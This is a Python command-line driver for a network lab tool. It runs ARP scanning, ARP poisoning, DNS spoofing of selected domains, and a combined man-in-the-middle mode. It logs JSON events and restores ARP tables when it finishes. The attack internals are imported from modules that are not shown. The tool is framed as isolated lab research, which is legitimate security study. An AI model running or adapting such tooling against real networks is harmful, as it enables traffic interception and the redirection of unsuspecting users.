#!/usr/bin/env python3
from __future__ import annotations

import argparse
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import signal
import threading

from lab.config import LAB_CONF_PATH, load_lab_settings
from lab.network import (
    default_interface,
    interface_ipv4,
    ipv4_forwarding_enabled,
    list_interfaces,
    set_ipv4_forwarding,
)


def require_root() -> None:
    if os.geteuid() != 0:
        raise SystemExit("Run this script as root inside the isolated lab")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Python entrypoint for isolated MITM lab research automation."
    )
    parser.add_argument(
        "--config",
        default=str(LAB_CONF_PATH),
        help="Path to lab.conf",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    subparsers.add_parser("interfaces", help="List local interfaces")

    discover = subparsers.add_parser("discover", help="ARP-scan the configured lab subnet")
    discover.add_argument("--interface", default=default_interface())

    arp = subparsers.add_parser("arp-poison", help="Run ARP poisoning inside the isolated lab")
    arp.add_argument("--interface", required=True)
    arp.add_argument("--victim-ip")
    arp.add_argument("--gateway-ip")
    arp.add_argument("--interval", type=float, default=2.0)
    arp.add_argument("--cycles", type=int)
    arp.add_argument("--enable-forwarding", action="store_true")

    dns = subparsers.add_parser("dns-spoof", help="Spoof selected DNS queries inside the isolated lab")
    dns.add_argument("--interface", required=True)
    dns.add_argument("--victim-ip")
    dns.add_argument("--answer-ip")
    dns.add_argument("--domains", nargs="*")
    dns.add_argument("--packet-count", type=int, default=0)

    mitm = subparsers.add_parser("mitm-dns", help="Run ARP poisoning and DNS spoofing together")
    mitm.add_argument("--interface", required=True)
    mitm.add_argument("--victim-ip")
    mitm.add_argument("--gateway-ip")
    mitm.add_argument("--answer-ip")
    mitm.add_argument("--domains", nargs="*")
    mitm.add_argument("--interval", type=float, default=2.0)
    mitm.add_argument("--enable-forwarding", action="store_true")

    return parser.parse_args()


def print_json(payload) -> None:
    print(json.dumps(payload, sort_keys=True), flush=True)


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def event_payload(event_type: str, **payload) -> dict:
    return {"ts": utc_now(), "event": event_type, **payload}


def install_stop_signal_handlers(stop_event: threading.Event) -> None:
    def _handler(signum, frame) -> None:  # noqa: ARG001
        stop_event.set()

    signal.signal(signal.SIGINT, _handler)
    signal.signal(signal.SIGTERM, _handler)


def main() -> int:
    args = parse_args()
    settings = load_lab_settings(path=Path(args.config))

    if args.command == "interfaces":
        print_json(
            {
                "default": default_interface(),
                "interfaces": list_interfaces(),
            }
        )
        return 0

    require_root()
    try:
        from mitm.research import LabResearchRunner
    except ModuleNotFoundError as exc:
        if exc.name and exc.name.startswith("scapy"):
            raise SystemExit("Missing dependency: install python3-scapy to use the research automation commands") from exc
        raise

    runner = LabResearchRunner(settings=settings, interface=args.interface)

    if args.command == "discover":
        hosts = runner.discover_hosts()
        print_json(
            {
                "interface": args.interface,
                "interface_ip": interface_ipv4(args.interface),
                "subnet": str(settings.lab_subnet),
                "hosts": [host.__dict__ for host in hosts],
            }
        )
        return 0

    if args.command == "arp-poison":
        stop_event = threading.Event()
        install_stop_signal_handlers(stop_event)
        poisoner = runner.build_arp_poisoner(
            victim_ip=args.victim_ip,
            gateway_ip=args.gateway_ip,
            interval=args.interval,
        )
        endpoints = poisoner.resolve_endpoints()
        changed_forwarding = False
        try:
            if args.enable_forwarding and not ipv4_forwarding_enabled():
                set_ipv4_forwarding(True)
                changed_forwarding = True
            print_json(
                event_payload(
                    "arp_poison_started",
                    interface=args.interface,
                    interval=args.interval,
                    victim_ip=endpoints.victim_ip,
                    gateway_ip=endpoints.gateway_ip,
                    victim_mac=endpoints.victim_mac,
                    gateway_mac=endpoints.gateway_mac,
                    attacker_mac=endpoints.attacker_mac,
                )
            )
            poisoner.run(
                cycles=args.cycles,
                stop_requested=stop_event.is_set,
                on_cycle=lambda cycle, resolved_endpoints: print_json(
                    event_payload(
                        "arp_poison_cycle",
                        cycle=cycle,
                        victim_ip=resolved_endpoints.victim_ip,
                        gateway_ip=resolved_endpoints.gateway_ip,
                        victim_mac=resolved_endpoints.victim_mac,
                        gateway_mac=resolved_endpoints.gateway_mac,
                        attacker_mac=resolved_endpoints.attacker_mac,
                    )
                ),
            )
        finally:
            poisoner.restore()
            print_json(
                event_payload(
                    "arp_poison_restored",
                    interface=args.interface,
                    victim_ip=endpoints.victim_ip,
                    gateway_ip=endpoints.gateway_ip,
                )
            )
            if changed_forwarding:
                set_ipv4_forwarding(False)
        return 0

    if args.command == "dns-spoof":
        stop_event = threading.Event()
        install_stop_signal_handlers(stop_event)
        spoofer = runner.build_dns_spoofer(
            answer_ip=args.answer_ip,
            domains=args.domains,
            victim_ip=args.victim_ip,
        )
        print_json(
            event_payload(
                "dns_spoof_started",
                interface=args.interface,
                victim_ip=spoofer.victim_ip,
                attacker_ip=spoofer.attacker_ip,
                gateway_ip=spoofer.gateway_ip,
                records=spoofer.records,
            )
        )
        spoofer.run(
            packet_count=args.packet_count,
            on_spoof=lambda event: print_json(
                event_payload(
                    "dns_spoof",
                    client_ip=event.client_ip,
                    query_name=event.query_name,
                    answer_ip=event.answer_ip,
                )
            ),
            stop_requested=stop_event.is_set,
        )
        print_json(event_payload("dns_spoof_stopped", interface=args.interface))
        return 0

    if args.command == "mitm-dns":
        stop_event = threading.Event()
        install_stop_signal_handlers(stop_event)
        poisoner = runner.build_arp_poisoner(
            victim_ip=args.victim_ip,
            gateway_ip=args.gateway_ip,
            interval=args.interval,
        )
        endpoints = poisoner.resolve_endpoints()
        spoofer = runner.build_dns_spoofer(
            answer_ip=args.answer_ip,
            domains=args.domains,
            victim_ip=args.victim_ip,
        )

        poison_thread = threading.Thread(
            target=poisoner.run,
            kwargs={
                "stop_requested": stop_event.is_set,
                "on_cycle": lambda cycle, resolved_endpoints: print_json(
                    event_payload(
                        "arp_poison_cycle",
                        cycle=cycle,
                        victim_ip=resolved_endpoints.victim_ip,
                        gateway_ip=resolved_endpoints.gateway_ip,
                        victim_mac=resolved_endpoints.victim_mac,
                        gateway_mac=resolved_endpoints.gateway_mac,
                        attacker_mac=resolved_endpoints.attacker_mac,
                    )
                ),
            },
            daemon=True,
        )

        changed_forwarding = False
        try:
            if args.enable_forwarding and not ipv4_forwarding_enabled():
                set_ipv4_forwarding(True)
                changed_forwarding = True
            print_json(
                event_payload(
                    "mitm_dns_started",
                    interface=args.interface,
                    interval=args.interval,
                    victim_ip=endpoints.victim_ip,
                    gateway_ip=endpoints.gateway_ip,
                    victim_mac=endpoints.victim_mac,
                    gateway_mac=endpoints.gateway_mac,
                    attacker_mac=endpoints.attacker_mac,
                    dns_records=spoofer.records,
                )
            )
            poison_thread.start()
            spoofer.run(
                on_spoof=lambda event: print_json(
                    event_payload(
                        "dns_spoof",
                        client_ip=event.client_ip,
                        query_name=event.query_name,
                        answer_ip=event.answer_ip,
                    )
                ),
                stop_requested=stop_event.is_set,
            )
        finally:
            stop_event.set()
            poison_thread.join(timeout=2)
            poisoner.restore()
            print_json(
                event_payload(
                    "mitm_dns_stopped",
                    interface=args.interface,
                    victim_ip=endpoints.victim_ip,
                    gateway_ip=endpoints.gateway_ip,
                )
            )
            if changed_forwarding:
                set_ipv4_forwarding(False)
        return 0

    raise SystemExit(f"Unknown command: {args.command}")


if __name__ == "__main__":
    raise SystemExit(main())
